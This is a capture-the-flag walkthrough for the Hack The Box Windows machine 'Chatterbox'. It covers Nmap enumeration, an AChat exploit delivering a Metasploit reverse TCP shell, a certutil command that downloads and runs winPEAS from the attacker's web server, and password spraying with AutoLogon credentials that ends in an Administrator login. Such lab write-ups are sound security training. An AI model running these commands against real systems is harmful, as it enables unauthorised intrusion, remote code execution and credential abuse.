# Chatterbox - Hack The Box Walkthrough

**Date**: 2024-11-21  

---

## Scope

The target is a Windows machine named `Chatterbox` with the following details:

- **IP Address**: `10.10.10.74`
- **OS**: Windows 7 Professional SP1
- **Computer Name**: `CHATTERBOX`
- **Workgroup**: `WORKGROUP`

---

## Enumeration

### 1. Full Port Scan
To identify open ports, I performed a full Nmap scan:
```bash
nmap -p- 10.10.10.74 -v -oN nmap/full_scan.chatterbox.txt
```

**Open Ports**:
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9255/tcp  open  mon
9256/tcp  open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

### 2. Service Enumeration
A more detailed scan was conducted on the identified ports:
```bash
nmap -p135,139,445,9255,9256,49152-49157 -A -T4 -v -oN nmap/service_scan.chatterbox.txt
```

**Key Findings**:
- **OS**: Windows 7 Professional SP1
- **Hostname**: CHATTERBOX
- **Workgroup**: WORKGROUP
- **Notable Services**:
  - SMB misconfiguration: Message signing disabled but not required.
  - Ports 9255 and 9256 associated with AChat chat software.

---

## SMB Enumeration

SMB enumeration was conducted using various tools (`enum4linux`, `crackmapexec`), but no valuable information was found. The misconfigured SMB signing (disabled but not required) could allow an SMB Relay attack.

```text
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

---

## RPC Enumeration

I used `rpcclient` and `rpcdump` to query RPC information, but no significant data was revealed.

---

## Exploitation

### 1. Identifying AChat
Ports 9255 and 9256 are commonly associated with AChat, a Windows-based chat application. Using `searchsploit` and online research, I found exploits for AChat:
- **Reference**: [Port 9256 Details](https://www.speedguide.net/port.php?port=9256)
- **Exploit**: [AChat-Reverse-TCP-Exploit](https://github.com/mpgn/AChat-Reverse-TCP-Exploit)

![Screenshot from 2024-11-22 17-05-24](https://github.com/user-attachments/assets/911bb632-cc95-4ea6-98c3-01c0e77a8411)

### 2. Exploiting AChat
Steps to exploit AChat:
1. **Clone the Exploit Repository**:
   ```bash
   git clone https://github.com/mpgn/AChat-Reverse-TCP-Exploit
   cd AChat-Reverse-TCP-Exploit
   ```
2. Change script permission and **Generate Payload**:
   ```bash
   chmod +x AChat_Payload.sh
   ./AChat_Payload.sh.sh
   ```
   I selected `windows/shell/reverse_tcp` as the payload.

3. **Set Up Listener**:
   On Metasploit, I configured the handler:
   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/shell/reverse_tcp
   set LHOST <your_ip>
   set LPORT <your_port>
   run
   ```

4. **Execute Exploit**:
   I updated the Python exploit script with the payload and executed it:
   ```bash
   AChat_Exploit.py
   ```

**Outcome**: Successfully gained a shell and retrieved the **user flag**.

![Screenshot from 2024-11-24 17-58-15](https://github.com/user-attachments/assets/c6a3f4a1-ff50-4bde-bce0-4af9e63d291f)

---

## Post Exploitation

### 1. Local Enumeration
I performed manual enumeration and transferred `winPEAS` to the target for privilege escalation analysis.
I started a listener on my machine:
```bash
python3 -m http.server 8081  # Start web server
```

Then I move in a temp directory and downloaded winPEAS:
```bash
cd C:\Windows\Temp
certutil -urlcache -f http://<your_ip>:8081/winPEASx86.exe wp.exe  # Download on target
wp.exe  # Execute winPEAS
```

### 2. AutoLogon Credentials
WinPEAS revealed AutoLogon credentials:
```
DefaultUserName: Alfred
DefaultPassword: ********
```

### 3. Password Spraying
Using the AutoLogon password, I tested all users on the target:
```bash
crackmapexec smb 10.10.10.74 -u users -p "********" --continue-on-success
```

**Outcome**: The password also worked for the `Administrator` account.

![Screenshot from 2024-11-24 18-13-47](https://github.com/user-attachments/assets/c97e9093-2419-40e0-9097-3fa1c76d6d36)

---

## Privilege Escalation

Using the administrator credentials, I logged in and retrieved the **root flag**.

### Steps:
1. **Login via WMIExec**:
   ```bash
   wmiexec.py CHATTERBOX/Administrator:"********"@10.10.10.74
   ```

2. **Flag Retrieval**:
   Navigated to the `C:\Users\Administrator\Desktop` directory and retrieved the root flag.

---

## Summary

1. Enumerated services and identified AChat running on port 9256.
2. Exploited AChat using a reverse TCP shell payload.
3. Retrieved AutoLogon credentials and escalated privileges via a password spraying attack.
4. Logged in as Administrator and retrieved both user and root flags.

---

## Resources

- [Port 9256 Details](https://www.speedguide.net/port.php?port=9256)
- [AChat-Reverse-TCP-Exploit](https://github.com/mpgn/AChat-Reverse-TCP-Exploit)

---

Let me know if you'd like to adjust or expand any section!
